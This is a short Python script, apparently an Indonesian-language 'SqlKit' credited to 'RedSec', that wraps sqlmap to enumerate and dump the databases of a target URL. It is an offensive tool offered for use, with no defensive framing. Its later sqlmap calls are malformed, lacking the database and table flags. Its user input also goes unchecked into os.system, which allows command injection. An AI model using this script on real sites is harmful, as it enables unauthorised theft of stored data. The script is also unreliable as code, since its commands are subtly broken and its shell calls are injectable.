import sys
import os
import time

os.system("clear")
print("""\033[93m.
  /$$$$$$            /$$ /$$   /$$ /$$   /$$    
 /$$__  $$          | $$| $$  /$$/|__/  | $$    
| $$  \__/  /$$$$$$ | $$| $$ /$$/  /$$ /$$$$$$  
|  $$$$$$  /$$__  $$| $$| $$$$$/  | $$|_  $$_/  
 \____  $$| $$  \ $$| $$| $$  $$  | $$  | $$    
 /$$  \ $$| $$  | $$| $$| $$\  $$ | $$  | $$ /$$
|  $$$$$$/|  $$$$$$$| $$| $$ \  $$| $$  |  $$$$/
 \______/  \____  $$|__/|__/  \__/|__/   \___/  
                | $$                            
                | $$                            
                |__/                            
=====================
| [*] Name : RedSec
| [*] Team : Msec
| [*] Youtube : RED SEC
=====================
""")

m1 = input ("Masukan target => ")
print(f"Target Lock => {m1}")
print("Proses...")
time.sleep(3)
os.system(f"sqlmap -u {m1} --dbs")
print("")
print("""
Apakah Data Base Tersedia? Kalo Tersedia Mari Ke Input
selanjutnya
""")
m2 = input ("Masukan Nama Data Base => ")
print("Proses...")
time.sleep(3)
os.system(f"sqlmap -u {m1} {m2} --tables")
print("")
print("""
Liat Banyak Data Base Yang Terbuka
Mari Kita Check 1 1
""")
m3 = input ("Masukan Nama Data Base => ")
print("Proses...")
time.sleep(3)
os.system(f"sqlmap -u {m1} {m2} --tables {m3} --dump")



